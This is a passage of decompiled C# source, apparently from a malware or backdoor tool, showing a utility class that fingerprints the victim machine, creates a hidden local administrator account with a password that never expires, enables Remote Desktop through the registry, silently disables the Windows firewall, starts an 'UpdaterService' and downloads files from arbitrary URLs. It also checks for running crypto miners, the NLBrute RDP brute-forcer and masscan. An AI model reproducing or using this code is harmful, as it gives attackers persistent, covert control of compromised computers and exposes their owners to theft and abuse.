    }

    public static string InfoTotalSizeHard()
    {
      try
      {
        DriveInfo driveInfo = new DriveInfo(Directory.GetDirectoryRoot("C:\\Windows"));
        long availableFreeSpace = driveInfo.AvailableFreeSpace;
        string driveFormat = driveInfo.DriveFormat;
        string name = driveInfo.Name;
        return ((float) ((double) driveInfo.TotalSize / 1024.0 / 1024.0 / 1024.0)).ToString() + " GB";
      }
      catch
      {
      }
      return "";
    }

    public static string InfoModelCPU()
    {
      try
      {
        string str = "";
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get())
          str = managementBaseObject["Name"].ToString();
        return str;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static void createUser(string Name, string Pass)
    {
      try
      {
        using (CmdService cmdService = new CmdService("cmd.exe"))
        {
          string empty = string.Empty;
          string command1 = "net user /add  " + Name + " " + Pass;
          cmdService.ExecuteCommand(command1);
          string command2 = "WMIC USERACCOUNT WHERE Name='" + Name + "' SET PasswordExpires=FALSE";
          cmdService.ExecuteCommand(command2);
          string command3 = "net localgroup administrators " + Name + " /add";
          cmdService.ExecuteCommand(command3);
          cmdService.Dispose();
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static string GetCPUId()
    {
      try
      {
        string empty = string.Empty;
        foreach (ManagementObject instance in new ManagementClass("Win32_Processor").GetInstances())
        {
          if (empty == string.Empty)
            empty = instance.Properties["ProcessorId"].Value.ToString();
        }
        return empty;
      }
      catch
      {
      }
      return "%1A123321123";
    }

    public static string GetmacAddresses()
    {
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      try
      {
        foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
        {
          if (networkInterface.OperationalStatus == OperationalStatus.Up)
          {
            empty1 += networkInterface.GetPhysicalAddress().ToString();
            break;
          }
        }
      }
      catch
      {
      }
      try
      {
        foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
          empty2 += (string) managementObject["ProcessorId"];
      }
      catch
      {
      }
      if (empty1.Trim().Length >= 5)
        return empty1;
      return empty2.Trim().Length >= 5 ? empty2 : "0000000000";
    }

    public static bool UserExists(string sUser)
    {
      try
      {
        using (CmdService cmdService = new CmdService("cmd.exe"))
        {
          string empty = string.Empty;
          string command = "net user";
          string str = cmdService.ExecuteCommand(command);
          cmdService.Dispose();
          return str.IndexOf(sUser) > -1;
        }
      }
      catch (Exception ex)
      {
      }
      return false;
    }

    public static string LanguageWindows()
    {
      try
      {
        return CultureInfo.InstalledUICulture.EnglishName;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static DateTime? GetLastLoginToMachine(string machineName, string userName)
    {
      try
      {
        return UserPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine, machineName), userName).LastLogon;
      }
      catch (Exception ex)
      {
      }
      return new DateTime?(DateTime.Now);
    }

    public static DateTime GetWindowsInstallationDateTime(string computerName)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computerName).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
        if (registryKey != null)
          return new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds((double) Convert.ToInt64(registryKey.GetValue("InstallDate").ToString()));
      }
      catch (Exception ex)
      {
      }
      return DateTime.MinValue;
    }

    public static void GetLastUsersLogin()
    {
      try
      {
        string str = "";
        foreach (ManagementObject managementObject in new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Win32_UserAccount")).Get())
          str = str + managementObject["Name"] + "=" + (object) FunctionBox.GetLastLoginToMachine(FunctionBox.InfoMachineName(), managementObject["Name"].ToString()) + "|";
        FunctionBox.listDateLoginUsers = str;
      }
      catch (Exception ex)
      {
      }
    }

    public static string CheckMiner()
    {
      try
      {
        return Process.GetProcessesByName("helper").Length != 0 || Process.GetProcessesByName("helper.exe").Length != 0 || Process.GetProcessesByName("help").Length != 0 || (uint) Process.GetProcessesByName("help.exe").Length > 0U ? "On" : "Off";
      }
      catch
      {
      }
      return "Off";
    }

    public static string CheckXmrig()
    {
      try
      {
        return Process.GetProcessesByName("xmrig").Length != 0 || (uint) Process.GetProcessesByName("xmrig.exe").Length > 0U ? "On" : "Off";
      }
      catch
      {
      }
      return "Off";
    }

    public static string CheckBrowser()
    {
      try
      {
        string str = "";
        if ((uint) Process.GetProcessesByName("firefox").Length > 0U)
          str = "firefox";
        if ((uint) Process.GetProcessesByName("chrome").Length > 0U)
          str = "chrome";
        if ((uint) Process.GetProcessesByName("browser").Length > 0U)
          str = "CryptoTab";
        if (str == "")
          return "Off";
      }
      catch
      {
      }
      return "Off";
    }

    public static string CheckNLbrute()
    {
      try
      {
        return Process.GetProcessesByName("nlbrute").Length != 0 || Process.GetProcessesByName("NL Brute 1.2").Length != 0 || (Process.GetProcessesByName("NLBrute 1.2").Length != 0 || Process.GetProcessesByName("TITAN_PRIVAT").Length != 0) || (Process.GetProcessesByName("NL Brute 1.2 x64").Length != 0 || Process.GetProcessesByName("NL Brute 1.2 x32").Length != 0 || (Process.GetProcessesByName("NL Brute 1.2 x64 & VPN").Length != 0 || Process.GetProcessesByName("NL Brute 1.2 x64.exe").Length != 0)) || (Process.GetProcessesByName("NL Brute 1.2 x64 & VPN.exe").Length != 0 || Process.GetProcessesByName("NLBrute 1.2 x64").Length != 0 || (Process.GetProcessesByName("NLBrute 1.2 x32").Length != 0 || Process.GetProcessesByName("NLBrute 1.2 x64 & VPN").Length != 0) || Process.GetProcessesByName("NLBrute 1.2 x64.exe").Length != 0) || (uint) Process.GetProcessesByName("NLBrute 1.2 x64 & VPN.exe").Length > 0U ? "On" : "Off";
      }
      catch (Exception ex)
      {
      }
      return "Off";
    }

    public static string CheckMasscan() => Process.GetProcessesByName("masscan").Length != 0 || (uint) Process.GetProcessesByName("Massscan_GUI").Length > 0U ? "On" : "Off";

    public static string CheckWinSCP()
    {
      try
      {
        return Process.GetProcessesByName("WinSCP.exe").Length != 0 || (uint) Process.GetProcessesByName("WinSCP").Length > 0U || System.IO.File.Exists("C:\\Program Files (x86)\\WinSCP\\WinSCP.exe") ? "On" : "Off";
      }
      catch
      {
        return "Off";
      }
    }

    public static string CheckRemoteDesktop() => (uint) Process.GetProcessesByName("mstsc").Length > 0U ? "On" : "Off";

    public static string CheckNLChecker() => (uint) Process.GetProcessesByName("NLChecker").Length > 0U ? "On" : "Off";

    public static void RunStart()
    {
      try
      {
        ServiceController serviceController = new ServiceController();
        serviceController.ServiceName = "UpdaterService";
        if (serviceController.Status != ServiceControllerStatus.Stopped)
          return;
        try
        {
          serviceController.Start();
          serviceController.WaitForStatus(ServiceControllerStatus.Running);
        }
        catch (InvalidOperationException ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static bool StatusRemoteDesktop()
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, FunctionBox.InfoMachineName()).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
        bool flag = (uint) (int) registryKey.GetValue("fDenyTSConnections") > 0U;
        registryKey.Flush();
        registryKey?.Close();
        return flag;
      }
      catch
      {
      }
      return false;
    }

    public static void ChangeStatusRemoteDesktop(bool flag)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, FunctionBox.InfoMachineName()).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
        bool flag1 = (uint) (int) registryKey.GetValue("fDenyTSConnections") > 0U;
        if (flag)
          registryKey.SetValue("fDenyTSConnections", (object) 0, RegistryValueKind.DWord);
        else
          registryKey.SetValue("fDenyTSConnections", (object) 1, RegistryValueKind.DWord);
        registryKey.Flush();
        registryKey?.Close();
      }
      catch (Exception ex)
      {
      }
    }

    public static bool StatusFirewall()
    {
      try
      {
        object instance = Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__1 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (bool), typeof (FunctionBox)));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: variable of the null type
        __Null target1 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__1.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, bool>> p1 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__1;
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "FirewallEnabled", (IEnumerable<Type>) null, typeof (FunctionBox), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj1 = ((Func<CallSite, object, int, object>) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__0.Target).Invoke((CallSite) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__0, instance, 1);
        ((Func<CallSite, object, bool>) target1).Invoke((CallSite) p1, obj1);
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__3 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (bool), typeof (FunctionBox)));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: variable of the null type
        __Null target2 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__3.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, bool>> p3 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__3;
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__2 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "FirewallEnabled", (IEnumerable<Type>) null, typeof (FunctionBox), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj2 = ((Func<CallSite, object, int, object>) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__2.Target).Invoke((CallSite) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__2, instance, 2);
        bool flag = ((Func<CallSite, object, bool>) target2).Invoke((CallSite) p3, obj2);
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__5 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__5 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (bool), typeof (FunctionBox)));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: variable of the null type
        __Null target3 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__5.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, bool>> p5 = FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__5;
        // ISSUE: reference to a compiler-generated field
        if (FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__4 == null)
        {
          // ISSUE: reference to a compiler-generated field
          FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__4 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "FirewallEnabled", (IEnumerable<Type>) null, typeof (FunctionBox), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj3 = ((Func<CallSite, object, int, object>) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__4.Target).Invoke((CallSite) FunctionBox.\u003C\u003Eo__59.\u003C\u003Ep__4, instance, 4);
        ((Func<CallSite, object, bool>) target3).Invoke((CallSite) p5, obj3);
        return flag;
      }
      catch (Exception ex)
      {
      }
      return false;
    }

    public static void ChangeStatusFirewall(bool flag)
    {
      if (!flag)
      {
        try
        {
          Process process = new Process();
          string str = "netsh.exe";
          process.StartInfo.Arguments = "Firewall set opmode disable";
          process.StartInfo.FileName = str;
          process.StartInfo.UseShellExecute = false;
          process.StartInfo.RedirectStandardOutput = true;
          process.StartInfo.CreateNoWindow = true;
          process.Start();
          process.WaitForExit();
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          Process process = new Process();
          string str = "netsh.exe";
          process.StartInfo.Arguments = "Firewall set opmode enable";
          process.StartInfo.FileName = str;
          process.StartInfo.UseShellExecute = false;
          process.StartInfo.RedirectStandardOutput = true;
          process.StartInfo.CreateNoWindow = true;
          process.Start();
          process.WaitForExit();
        }
        catch
        {
        }
      }
    }

    public static void DownloadFile(string urlAddress, string location)
    {
      WebClient webClient;
      using (webClient = new WebClient())
      {
        Uri address = urlAddress.StartsWith("hxxp://", StringComparison.OrdinalIgnoreCase) ? new Uri(urlAddress) : new Uri("hxxp://" + urlAddress);
        try
        {
          webClient.DownloadFileAsync(address, location);
        }
        catch
        {
        }
      }
    }

    public static string GetGraphic()
    {
      try
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        {
          foreach (PropertyData property in managementBaseObject.Properties)
          {
            if (property.Name == "Description")
              return property.Value.ToString() + Environment.NewLine;
          }
        }
        return "";
      }
      catch
      {
        return "";
      }
    }

    public static string GetGraphic2()
    {
      try
      {
        foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_VideoController").Get())
        {
          PropertyData property1 = managementObject.Properties["CurrentBitsPerPixel"];
          PropertyData property2 = managementObject.Properties["Description"];
          if (property1 != null && property2 != null && property1.Value != null)
            return property2.Value.ToString() + Environment.NewLine;
        }
        return "";
      }
      catch
      {
        return "";
      }
    }

    public static string GetNetworkInterface()
    {
      string str = "";
      try
      {
        foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
        {
          if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
          {
            foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
            {
              if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork)
                str = str + networkInterface.Name + " - " + unicastAddress.Address.ToString() + Environment.NewLine + " | ";
            }
          }
        }
        return str;
      }
      catch
      {
        return str;
      }
    }

    private static Image GetImage(string filePath) => Image.FromStream((Stream) new MemoryStream(new WebClient().DownloadData(filePath)));

    public static string ImageToBase64(Image image, ImageFormat format)
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        image.Save((Stream) memoryStream, format);
        return Convert.ToBase64String(memoryStream.ToArray());
      }
    }

    public static string CreateMD5Hash(string input)
    {
      byte[] hash = MD5.Create().ComputeHash(Encoding.ASCII.GetBytes(input));
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < hash.Length; ++index)
        stringBuilder.Append(hash[index].ToString("X2"));
      return stringBuilder.ToString();
    }
  }
}
